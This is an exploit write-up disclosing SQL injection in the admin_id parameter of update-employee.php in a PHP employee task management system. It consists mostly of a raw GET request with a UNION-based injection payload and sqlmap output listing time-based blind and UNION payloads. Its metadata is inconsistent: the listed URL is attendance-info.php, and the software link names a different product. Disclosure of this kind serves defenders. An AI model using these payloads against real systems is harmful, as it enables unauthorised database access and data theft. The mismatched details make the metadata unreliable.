# Exploit Title: employee task management system - SQLi

### Date: 
> March 15th, 2024

### Author: 
> tht1997
### Vendor Homepage:
> https://www.sourcecodester.com

### Software Link:
> [employee task management system](https://www.sourcecodester.com/php/15371/auto-dealer-management-system-phpoop-free-source-code.html)
### Version:
> v 1.0
### URL:
> [/taskmatic/attendance-info.php](taskmatic/attendance-info.php)
### Proof of Concept:
Review source code
![SQL](https://github.com/tht1997/WhiteBox/blob/main/sourcecodester/update-employee.png?raw=true)
\
Step 1. Go to URL /update-employee.php?admin_id=
\
Step 2. Run with sqlmap

```
GET /taskmatic/update-employee.php?admin_id=-3580%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x71786a7171%2C0x4d454655527a5759756977515963705172466b7571445763574e5955704353476273685474526846%2C0x71706b7171%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20- HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=au6ifo1ssaop7ilk8c4f09pj2j
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Connection: close

```

Step 3. sqlmap result

```
[20:40:26] [INFO] GET parameter 'admin_id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[20:40:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[20:40:48] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[20:40:50] [INFO] target URL appears to be UNION injectable with 7 columns
[20:40:51] [INFO] GET parameter 'admin_id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'admin_id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
---
Parameter: admin_id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: admin_id=28' AND (SELECT 9712 FROM (SELECT(SLEEP(5)))LThc) AND 'CUEh'='CUEh

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: admin_id=-3580' UNION ALL SELECT NULL,CONCAT(0x71786a7171,0x4d454655527a5759756977515963705172466b7571445763574e5955704353476273685474526846,0x71706b7171),NULL,NULL,NULL,NULL,NULL-- -
---
[20:42:08] [INFO] the back-end DBMS is MySQL
web application technology: PHP 7.4.30, Apache 2.4.54
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```
